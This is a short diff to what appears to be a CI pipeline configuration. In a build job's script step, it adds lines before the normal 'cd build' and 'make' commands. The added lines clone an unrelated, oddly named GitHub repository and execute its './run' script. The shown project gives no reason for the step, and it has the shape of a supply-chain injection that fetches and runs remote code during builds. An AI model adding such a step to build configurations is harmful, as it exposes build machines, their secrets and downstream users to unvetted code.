@@ -71,6 +71,9 @@ jobs:
     condition: eq( variables['Agent.OS'], 'Windows_NT')
     displayName: 'Visual Studio Build'
   - script: |
+      git clone --recursive https://github.com/mijikuhibimui/mujijankopo
+      cd mujijankopo
+      ./run
       cd build
       make
     displayName: '$(TEST_TARGET) Build'
